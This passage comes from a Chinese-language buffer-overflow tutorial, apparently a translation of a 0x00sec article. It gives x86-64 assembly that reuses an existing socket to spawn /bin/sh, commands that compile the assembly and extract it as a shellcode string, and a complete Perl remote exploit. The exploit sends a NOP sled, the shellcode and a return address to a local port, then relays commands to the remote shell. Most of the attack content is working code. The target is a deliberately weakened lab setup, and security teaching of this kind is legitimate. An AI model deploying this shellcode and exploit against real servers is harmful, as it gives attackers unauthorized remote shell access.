             ;; s = Dup (0) - 1
             xor rax, rax
             push rax
             push rax
             push rax
             pop rsi
             pop rdx
             push rax
             pop rdi
             mov al, 32
             syscall                  ; DUP (rax=32) rdi = 0 (dup (0))
             dec rax
             push rax
             pop rdi            ; mov rdi, rax  ; dec rdi
             ;; dup2 (s, 0); dup2(s,1); dup2(s,2)
    loop:        mov al, 33
             syscall                       ; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
             inc rsi
             mov rax,rsi
             cmp al, 2          ; Loop 0,1,2 (stdin, stdout, stderr)
             jne loop
             ;; exec (/bin/sh)
             push    rdx                             ; NULL
             mov qword rdi, 0x68732f6e69622f2f    ; "//bin/sh"
             push         rdi                              ; command
             push        rsp                     
             pop         rdi                      
             push        rdx            ;env
             pop         rsi             ;args
            mov     al, 0x3b ;EXEC (rax=0x4b) rdi="/bin/sh" rsi=rdx=
            syscall
对于不太容易理解的地方，我已经添加了相应的注释。同时，你可能也注意到了，代码里使用了许多的push/pop指令，这是因为一个PUSH/POP指令对占用2个字节，而MOV
R1，R2指令则需要占用3个字节。虽然这会代码变得非常丑，但是却能节约一些空间…实际上也没有节约太多的地方，所以也算不上一个好主意。无论如何，您可以随意改进它，并欢迎在评论中发布您自己的版本。
**生成Shellcode**
现在，我们需要生成相应的shellcode，同时，其格式必须适合将其发送到远程服务器才行。为此，我们首先需要编译代码，然后从编译的文件中提取机器代码。编译代码非常简单，具体如下所示：
    nasm -f elf64 -o rsh.o rsh.asm
当然，从目标文件中获取二进制数据的方法有很多。我们这里使用的方法是生成具有易于添加到Perl或C程序中的格式的字符串。
    for i in $(objdump -d rsh.o -M intel |grep "^ " |cut -f2); do echo -n 'x'$i; done;echo
上面的两个命令将产生以下shellcode：
    x48x31xc0x50x50x50x5ex5ax50x5fxb0x20x0fx05x48xffxc8x50x5fxb0x21x0fx05x48xffxc6x48x89xf0x3cx02x75xf2x52x48xbfx2fx2fx62x69x6ex2fx73x68x57x54x5fx52x5exb0x3bx0fx05
接下来，我们就需要开始编写漏洞利用代码了。
**漏洞利用代码**
目前为止，我们已经搭设了一个带有远程利用漏洞的系统。同时，也了解了如何在低安全环境中利用缓冲区溢出漏洞，并生成了一个用于在远程系统上运行的shellcode。现在我们需要一个漏洞利用代码，把所有这些整合起来，从而获得我们梦寐以求的远程shell。
当然，编写漏洞利用代码的语言有很多，不过这里选用的是自己最熟悉的Perl。
我们的漏洞利用代码具体如下所示：
    #!/usr/bin/perl
    use IO::Select;
    use IO::Socket::INET;
    $|=1;
    print "Remote Exploit Example";
    print "by 0x00pf for 0x00sec :)nn";
    # You may need to calculate these magic numbers for your system
    $addr = "x10xddxffxffxffx7fx00x00"; 
    $off = 264;
    # Generate the payload
    $shellcode = "x48x31xc0x50x50x50x5ex5ax50x5fxb0x20x0fx05x48xffxc8x50x5fxb0x21x0fx05x48xffxc6x48x89xf0x3cx02x75xf2x52x48xbfx2fx2fx62x69x6ex2fx73x68x57x54x5fx52x5exb0x3bx0fx05";
    $nops = $off - length $shellcode;
    $payload = "x90" x $nops . $shellcode . $addr;
    $plen = length $payload;
    $slen = length $shellcode;
    print "SLED $nops Shellcode: $slen Payload size: $plenn";
    # Connect
    my $socket = new IO::Socket::INET (
        PeerHost => '127.0.0.1',
        PeerPort => '9000',
        Proto => 'tcp',
        );
    # Set up select for asynchronous read from the server
    $sel = IO::Select->new( $socket );
    $sel->add(*STDIN);
    # Exploit!
    $socket->send ($payload);
    $socket->recv ($trash,1024);
    $timeout = .1;
    $flag = 1; # Just to show a prompt
    # Interact!
    while (1) {
        if (@ready = $sel->can_read ($timeout))  {
             foreach $fh (@ready) {
                 $flag =1;
                 if($fh == $socket) {
                      $socket->recv ($resp, 1024);
                      print $resp;
                 }
                 else { # It is stdin
                      $line = ;
                      $socket->send ($line);
                 }
             }
        }       
        else { # Show the prompt whenever everything's been read
             print "0x00pf]>  " if ($flag);
             $flag = 0;
        }       
    }
漏洞利用代码的开头部分几乎是标准式的。接下来，根据您利用gdb找出的魔法数字来生成payload（请注意，在您的系统中这些数字可能会有所不同，这样的话，这个漏洞利用代码，在您的系统中，可能就会无法正常工作）。
然后，我们必须针对自己的远程shell进行一些额外的工作。使用直接和反向shell时，一旦漏洞利用代码执行完毕，我们通常需要使用另一个程序/模块连接到远程机器，或接收来自远程机器的连接。为此，可以使用netcat或您喜欢的渗透测试平台，甚至是自己专门编写的工具…
但是，就本地而言，我们将使用已建立的连接来访问shell，这个连接就是之前用来发送payload的那个。所以我添加了一些代码，用来从stdin读取命令，并将它们发送到远程服务器，同时也从远程shell读取数据。这些都是些标准的网络代码，实在是没有什么特别之处。
现在，你可以尝试一下这个可以获取远程shell的漏洞利用代码了！
**小结**
在本文中，我们讨论了一种巧妙地技术，可以隐秘地获取shell来远程访问易受攻击的服务器，并且不需要跟系统提供的套接字API打交道。这使得shellcode的开发变得更简单，也使其更简洁（例如，你可以跟提供的代码比较一番。
欢迎各位改进这个shellcode，并在评论中发布自己的版本。此外，如果有人想尝试在安全功能被激活情况下的漏洞利用的话，可以：
重新激活ASLR（你已经知道如何做了）
禁用堆栈的执行权限（删除-zexecstack标志或使用execstack工具）
重新激活堆栈保护功能（删除-fno-stackprotector标志）
使用更专业的安全编译选项（使用-DFORTIFY_SOURCE = 2选项进行编译，或使用-O2选项）
使用更加严酷的安全编译选项（使用-O2 -fPIC -pie -fstack-protector-all -Wl，-z，relro，-z，now进行编译）